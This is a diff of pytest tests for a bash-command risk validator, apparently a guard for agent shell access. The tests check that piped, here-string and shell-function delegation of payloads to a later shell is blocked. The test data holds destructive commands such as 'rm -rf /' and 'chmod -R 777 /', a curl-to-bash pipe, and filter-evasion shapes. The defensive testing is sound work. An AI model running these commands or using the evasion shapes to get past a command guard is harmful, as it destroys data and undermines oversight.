@@ -12,8 +12,11 @@ zsh): `bash -c -- PROG` runs PROG; `bash -ce PROG` runs PROG; `bash -cPROG` is r
 with "option requires an argument", so an attached payload is not a thing.
 """
 
+import signal
+
 import pytest
 
+from schlock.core import parser as parser_module
 from schlock.core import validator
 from schlock.core.parser import BashCommandParser
 from schlock.core.rules import RiskLevel
@@ -641,13 +644,26 @@ class TestHereStringPayloadExtraction:
     def test_compound_here_string_finds_a_later_command_sink(self):
         # CodeRabbit CWE-78 (Critical, #151): the stdin consumer need not be the FIRST command -
         # an earlier command that does not read stdin (`true`, `echo`) leaves the here-string for
-        # the next. Checking only _first_command_node missed all of these. Verified in real bash.
+        # the next. Checking only the first command missed all of these. Verified in real bash.
         assert self._extract('{ true; bash; } <<< "rm -rf /"') == [("bash", "rm -rf /")]
         assert self._extract('( true; bash ) <<< "rm -rf /"') == [("bash", "rm -rf /")]
         assert self._extract('{ echo pre; bash; } <<< "rm -rf /"') == [("bash", "rm -rf /")]
         assert self._extract('while :; do bash; done <<< "rm -rf /"') == [("bash", "rm -rf /")]
         assert self._extract('if true; then bash; fi <<< "rm -rf /"') == [("bash", "rm -rf /")]
         assert self._extract('for i in 1; do bash; done <<< "rm -rf /"') == [("bash", "rm -rf /")]
+
+    def test_compound_non_shell_interpreter_does_not_shadow_a_later_shell(self):
+        # LAB-3006 adversarial HIGH: `python3 --version` fails closed as a stdin reader, so a
+        # first-match return surfaced only ("python3", X), the caller dropped it as non-shell, and
+        # the later `bash` that actually runs X was never re-validated. Every sink is surfaced.
+        assert self._extract('{ python3 --version; bash; } <<< "rm -rf /"') == [
+            ("python3", "rm -rf /"),
+            ("bash", "rm -rf /"),
+        ]
+
+    def test_wrapper_non_shell_operand_does_not_shadow_the_shell(self):
+        # `env -u python3` unsets a variable named python3; bash runs the here-string (verified).
+        assert ("bash", "rm -rf /") in self._extract('env -u python3 -i bash <<< "rm -rf /"')
 
     def test_compound_without_an_interpreter_surfaces_nothing(self):
         # Only a stdin-executing interpreter is a sink; `cat`/`read` consume stdin but never run it.
@@ -740,12 +756,23 @@ class TestHereStringDelegationEvasion:
             '{ bash; } <<< "rm -rf /"',
             '( timeout 5 bash ) <<< "rm -rf /"',
             # Later-command consumers - CodeRabbit CWE-78 Critical on #151 (a benign first command
-            # decoys _first_command_node while a later shell runs the here-string).
+            # decoys a first-command-only check while a later shell runs the here-string).
             '{ true; bash; } <<< "rm -rf /"',
             '( true; bash ) <<< "rm -rf /"',
             '{ echo pre; bash; } <<< "rm -rf /"',
             'while :; do bash; done <<< "rm -rf /"',
             'if true; then bash; fi <<< "rm -rf /"',
+            # A non-shell interpreter ahead of the shell must not shadow it (LAB-3006 adversarial
+            # HIGH; pre-fix HIGH / allowed=True). `python3 --version` exits without reading stdin.
+            '{ python3 --version; bash; } <<< "chmod -R 777 /"',
+            'while :; do python3 --version; bash; done <<< "chmod -R 777 /"',
+            'if true; then python3 -V; bash; fi <<< "chmod -R 777 /"',
+            '{ node -v; sh; } <<< "rm -rf /"',
+            # Same shadowing inside a wrapper: a non-shell basename in an option-value slot must not
+            # win the operand scan over the shell the wrapper runs (LAB-3006 panel MAJ; pre-fix HIGH).
+            'env -u python3 -i bash <<< "chmod -R 777 /"',
+            'strace -o python3 -f bash <<< "chmod -R 777 /"',
+            '{ strace -o python3 -f bash; } <<< "chmod -R 777 /"',
             # rbash is a shell the `-c` path already caught; the `<<<` spelling must agree.
             'rbash <<< "rm -rf /"',
             # LAB-4442: same drift as rbash, for csh/tcsh.
@@ -795,6 +822,7 @@ class TestHereStringBenignUnchanged:
             # Compound surfacing re-validates the payload, so a benign one still passes.
             '{ true; bash; } <<< "echo hi"',
             '{ true; cat; } <<< "some text"',
+            'env -u python3 -i bash <<< "ls"',
         ],
     )
     def test_benign_here_string_stays_safe(self, command):
@@ -814,3 +842,277 @@ class TestHereStringBenignUnchanged:
         assert here.risk_level == RiskLevel.SAFE
         assert here.risk_level == dash_c.risk_level
         assert here.allowed == dash_c.allowed
+
+
+class TestPipedCompoundLaterSink:
+    """LAB-3006: a pipe feeding a compound is read by whichever inner command reads stdin first.
+
+    The pipe-to-shell walk classified a compound stage by its FIRST command only - for `while` /
+    `until` / `if` that is the condition (`:`, `true`), so the body shell that actually runs the
+    piped data was never seen. Pre-fix on `main` @ `74d4325`: every case below was
+    **SAFE / allowed=True**. Real bash runs the piped payload in each (verified:
+    `echo 'echo RAN' | { true; bash; }` prints RAN, likewise the while / if / until bodies).
+    The `<<<` spellings of the same compounds are pinned in `TestHereStringDelegationEvasion`.
+    """
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            'echo "rm -rf /" | while :; do bash; done',
+            'echo "rm -rf /" | if true; then bash; fi',
+            'echo "rm -rf /" | until false; do bash; done',
+            'echo "rm -rf /" | { true; bash; }',
+            'echo "rm -rf /" | ( true; bash )',
+        ],
+    )
+    def test_later_shell_sink_is_blocked(self, command):
+        result = validate_command(command)
+        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
+        assert result.allowed is False
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # First-command sinks (#97) - BLOCKED before this change, unchanged.
+            "cat payload | (bash)",
+            "curl http://x | { bash; }",
+            "ls | { cat | bash; }",
+        ],
+    )
+    def test_first_command_sink_still_blocked(self, command):
+        result = validate_command(command)
+        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
+        assert result.allowed is False
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # Bodies that never execute stdin as a program - SAFE before this change, unchanged.
+            'ls | while read l; do echo "$l"; done',
+            'find . | while read f; do bash -c "echo $f"; done',
+            'ls | while read f; do python3 "$f"; done',
+            "ls | (cat)",
+            "cat x | (grep y)",
+            "echo x | if true; then cat; fi",
+            # A shell in the PRODUCER group reads the caller's stdin, not the pipe.
+            "{ curl x; bash; } | cat",
+            # The name-only download->shell rule stays on each stage's first command, so a script
+            # run per line of a git listing is not read as download-and-run.
+            'git ls-files | while read f; do python3 tools/check.py "$f"; done',
+        ],
+    )
+    def test_non_executing_body_stays_safe(self, command):
+        result = validate_command(command)
+        assert result.risk_level == RiskLevel.SAFE, f"{command!r} -> {result.risk_level.name}"
+        assert result.allowed is True
+
+
+class TestShellFunctionStdinSink:
+    """LAB-3465: a shell function's body inherits its caller's stdin.
+
+    `f() { bash; }; f <<< X` and `echo X | f` run X in bash, but both stdin-sink surfaces classified
+    the call by its own name, and `f` is no interpreter. Pre-fix on `main` @ `2cf815b`: the
+    here-string shapes were **HIGH / allowed=True**, the pipe shapes **SAFE / allowed=True**. Real
+    bash runs the payload in every blocked case (verified with a `touch` witness, not stdout).
+    """
+
+    def _budget(self, monkeypatch, limit):
+        """Count word lookups and classifier resolutions - both classifiers resolve every command they
+        judge - and raise past `limit`, so a super-linear regression FAILS instead of hanging CI."""
+        calls = [0]
+        for name in ("_command_words", "_resolve_multicall"):
+            real = getattr(parser_module, name)
+
+            def counting(*args, real=real):
+                calls[0] += 1
+                if limit is not None and calls[0] > limit:
+                    raise AssertionError(f"over {limit} lookups: not linear")
+                return real(*args)
+
+            monkeypatch.setattr(parser_module, name, counting)
+        return calls
+
+    def _here(self, command):
+        parser = BashCommandParser()
+        return parser.extract_stdin_program_redirects(parser.parse(command))
+
+    def _pipe(self, command):
+        parser = BashCommandParser()
+        return parser._detect_dangerous_pipelines(parser.parse(command))
+
+    def test_here_string_call_resolves_to_the_body(self):
+        assert self._here('f() { bash; }; f <<< "rm -rf /"') == [("bash", "rm -rf /")]
+        assert self._here('function f { bash; }; f <<< "rm -rf /"') == [("bash", "rm -rf /")]
+        assert self._here('f() { true; bash; }; f <<< "rm -rf /"') == [("bash", "rm -rf /")]
+        assert self._here('f() { timeout 5 bash; }; f <<< "rm -rf /"') == [("bash", "rm -rf /")]
+        # Transitive, called inside a group, defined in a branch, defined inside another body.
+        assert self._here('f() { g; }; g() { bash; }; f <<< "rm -rf /"') == [("bash", "rm -rf /")]
+        assert self._here('f() { bash; }; { f; } <<< "rm -rf /"') == [("bash", "rm -rf /")]
+        assert self._here('if true; then f() { bash; }; fi; f <<< "rm -rf /"') == [("bash", "rm -rf /")]
+        assert self._here('f() { g() { bash; }; }; f; g <<< "rm -rf /"') == [("bash", "rm -rf /")]
+
+    def test_pipe_call_resolves_to_the_body(self):
+        danger = "data piped into shell interpreter: bash"
+        assert self._pipe('f() { bash; }; echo "rm -rf /" | f') == [danger]
+        assert self._pipe('function f { bash; }; echo "rm -rf /" | f') == [danger]
+        assert self._pipe('f() { true; bash; }; echo "rm -rf /" | f') == [danger]
+        assert self._pipe('f() { g; }; g() { bash; }; echo "rm -rf /" | f') == [danger]
+        assert self._pipe('f() { bash; }; echo "rm -rf /" | { f; }') == [danger]
+        assert self._pipe('f() { sh; }; echo "rm -rf /" | f') == ["data piped into shell interpreter: sh"]
+
+    def test_non_shell_body_command_does_not_shadow_the_shell(self):
+        # Every interpreter reached is surfaced, in either order and whether the shell is direct or
+        # behind the call; the validator keeps the shell ones.
+        assert ("bash", "rm -rf /") in self._here('f() { python3 --version; bash; }; f <<< "rm -rf /"')
+        assert ("bash", "rm -rf /") in self._here('f() { bash; python3 --version; }; f <<< "rm -rf /"')
+        assert ("bash", "rm -rf /") in self._here('f() { python3 --version; }; { f; bash; } <<< "rm -rf /"')
+        assert ("bash", "rm -rf /") in self._here('f() { bash; }; { python3 --version; f; } <<< "rm -rf /"')
+
+    def test_wrapper_non_shell_operand_in_a_body_does_not_shadow_the_shell(self):
+        # One body command, two interpreter operands: the function table must keep every one the
+        # wrapper scan returns, or `python3` (an option value) shadows the bash that runs X (LAB-3006).
+        assert ("bash", "rm -rf /") in self._here('f() { env -u python3 -i bash; }; f <<< "rm -rf /"')
+        assert ("bash", "rm -rf /") in self._here('f() { strace -o python3 -f bash; }; f <<< "rm -rf /"')
+
+    def test_redefinition_over_approximates(self):
+        # DECISION: bindings are a union over the whole parse, not an ordered scope model. Only the
+        # first `f` is live at the call, so real bash runs nothing - the payload is surfaced and
+        # re-validated anyway, which fails closed on a dangerous one and passes a benign one.
+        assert self._here('f() { true; }; f <<< "rm -rf /"; f() { bash; }') == [("bash", "rm -rf /")]
+        # The other order is the live one: a later decoy definition must not displace the shell.
+        assert self._here('f() { bash; }; f <<< "rm -rf /"; f() { :; }') == [("bash", "rm -rf /")]
+        assert self._pipe('f() { bash; }; echo "rm -rf /" | f; f() { :; }') == ["data piped into shell interpreter: bash"]
+
+    def test_nested_definition_counts_toward_the_enclosing_body(self):
+        # DECISION: a nested definition's body is folded into the enclosing function or group. Calling
+        # `f` below only defines `g`, so real bash runs nothing - but bash can also call `g` without
+        # naming it, which the table cannot resolve, so over-counting is the fail-closed reading.
+        assert self._here('f() { g() { bash; }; }; f <<< "rm -rf /"') == [("bash", "rm -rf /")]
+        assert self._pipe('f() { g() { bash; }; }; echo "rm -rf /" | f') == ["data piped into shell interpreter: bash"]
+        # Each of these runs the payload in real bash through a call that never names `g`.
+        assert self._pipe('echo "rm -rf /" | { g() { bash; }; trap g EXIT; }') == ["data piped into shell interpreter: bash"]
+        assert self._here('{ command_not_found_handle() { bash; }; zzz; } <<< "rm -rf /"') == [("bash", "rm -rf /")]
+        # A redirect on the definition itself applies at every call (`f` below runs the payload).
+        assert self._here('f() { bash; } <<< "rm -rf /"; f') == [("bash", "rm -rf /")]
+
+    def test_call_by_a_name_the_stage_classifier_cannot_read(self):
+        # bash resolves `f/` to the function; the stage's own name lookup returns nothing for a word
+        # ending in `/`, and dropping that stage skipped rule (2) altogether.
+        assert self._pipe('f/() { bash; }; echo "rm -rf /" | f/') == ["data piped into shell interpreter: bash"]
+        assert self._pipe('f/() { bash; }; echo "rm -rf /" | { f/; }') == ["data piped into shell interpreter: bash"]
+
+    @pytest.mark.skipif(not hasattr(signal, "SIGALRM"), reason="needs SIGALRM")
+    def test_recursion_reaching_a_shell_terminates(self):
+        # Each (function, interpreter) pair propagates once; without that a self-call loops forever
+        # in a loop that makes no lookup `_budget` could count, so an alarm turns the hang into a failure.
+        def expire(signum, frame):
+            raise AssertionError("function-table propagation did not terminate")
+
+        previous = signal.signal(signal.SIGALRM, expire)
+        signal.alarm(10)
+        try:
+            assert self._here('f() { bash; f; }; f <<< "rm -rf /"') == [("bash", "rm -rf /")]
+            assert self._pipe('f() { bash; g; }; g() { f; }; echo "rm -rf /" | g') == ["data piped into shell interpreter: bash"]
+        finally:
+            signal.alarm(0)
+            signal.signal(signal.SIGALRM, previous)
+
+    def test_here_string_free_command_classifies_no_body(self, monkeypatch):
+        # Classifying a body runs the here-string classifier's wrapper scan; a command with no `<<<`
+        # anywhere has nothing for a body to read, so it must not pay that scan per body command.
+        calls = self._budget(monkeypatch, limit=None)
+        assert self._here("f() { nice bash -x bash -x bash -c :; }; echo hi") == []
+        assert calls[0] == 0, f"{calls[0]} lookups on a command without a here-string"
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            'f() { cat; }; f <<< "some text"',
+            'f() { bash -c "echo hi"; }; f <<< "rm -rf /"',
+            'f() { bash script.sh; }; f <<< "rm -rf /"',
+            'f() { bash; }; g <<< "rm -rf /"',
+            'f() { g; }; g() { f; }; f <<< "rm -rf /"',
+        ],
+    )
+    def test_body_without_a_stdin_program_surfaces_no_here_string(self, command):
+        assert self._here(command) == []
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            'f() { cat; }; echo "some text" | f',
+            "f() { grep x; }; echo y | f",
+            "f() { python3 x.py; }; echo y | f",
+            'f() { bash -c "echo hi"; }; echo y | f',
+            "f() { g; }; g() { f; }; echo y | f",
+            # A shell in the PRODUCER reads the caller's stdin, not the pipe.
+            "f() { bash; }; f | cat",
+        ],
+    )
+    def test_body_without_a_stdin_program_raises_no_pipe_danger(self, command):
+        assert self._pipe(command) == []
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            'f() { bash; }; f <<< "rm -rf /"',
+            'function f { bash; }; f <<< "rm -rf /"',
+            'f() { timeout 5 bash; }; f <<< "rm -rf /"',
+            'f() { g; }; g() { bash; }; f <<< "rm -rf /"',
+            'f() { bash; }; { f; } <<< "rm -rf /"',
+            'f() { python3 --version; bash; }; f <<< "rm -rf /"',
+            'f() { env -u python3 -i bash; }; f <<< "rm -rf /"',
+            'f() { bash; }; echo "rm -rf /" | f',
+            'f() { g; }; g() { bash; }; echo "rm -rf /" | f',
+            'f() { true; bash; }; echo "rm -rf /" | f',
+            'f() { sh; }; printf "%s\\n" "rm -rf /" | f',
+        ],
+    )
+    def test_function_delegation_is_blocked(self, command):
+        result = validate_command(command)
+        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
+        assert result.allowed is False
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # The here-string is surfaced and re-validated, so a benign payload still passes.
+            'f() { bash; }; f <<< "echo hi"',
+            'f() { cat; }; f <<< "some text"',
+            'f() { cat; }; echo "some text" | f',
+            "f() { grep x; }; echo y | f",
+            "f() { python3 x.py; }; echo y | f",
+            'f() { bash -c "echo hi"; }; echo hi | f',
+            # Defining a stdin-reading function and calling it without stdin feeds it nothing.
+            "f() { bash; }; f",
+        ],
+    )
+    def test_benign_function_stays_safe(self, command):
+        result = validate_command(command)
+        assert result.risk_level == RiskLevel.SAFE, f"{command!r} -> {result.risk_level.name}"
+        assert result.allowed is True
+
+    def test_diamond_call_graph_terminates(self, monkeypatch):
+        # A per-path walk re-visits this DAG 2^24 times - past the hook timeout, which fails OPEN.
+        self._budget(monkeypatch, limit=1000)
+        dag = " ".join(f"f{i}() {{ f{i + 1}; f{i + 1}; }};" for i in range(24)) + " f24() { bash; };"
+        assert self._here(dag + ' f0 <<< "rm -rf /"') == [("bash", "rm -rf /")]
+        assert self._pipe(dag + ' echo "rm -rf /" | f0') == ["data piped into shell interpreter: bash"]
+
+    @pytest.mark.parametrize("surface", ["here", "pipe"])
+    @pytest.mark.parametrize("shape", ["fat", "star"])
+    def test_cost_is_linear_in_bodies_and_call_sites(self, surface, shape, monkeypatch):
+        # Counted, not timed. `fat`: one body called from every site - a re-walk per call site is
+        # quadratic. `star`: many functions sharing one body - a reachability walk per name is.
+        calls = self._budget(monkeypatch, limit=None)
+        body, sites = 200, 200
+        call = "{f} <<< y" if surface == "here" else "x | {f}"
+        if shape == "fat":
+            command = "f() { " + "a; " * body + "}; " + "; ".join(call.format(f="f") for _ in range(sites))
+        else:
+            fns = "".join(f"f{i}() {{ g; }}; " for i in range(sites))
+            command = "g() { " + "a; " * body + "}; " + fns + "; ".join(call.format(f=f"f{i}") for i in range(sites))
+        found = self._here(command) if surface == "here" else self._pipe(command)
+        assert found == []
+        assert calls[0] >= body, f"{calls[0]} lookups: the monkeypatch did not observe the scan"
+        assert calls[0] <= 6 * (body + 2 * sites), f"{calls[0]} lookups for {body} x {sites}: not linear"
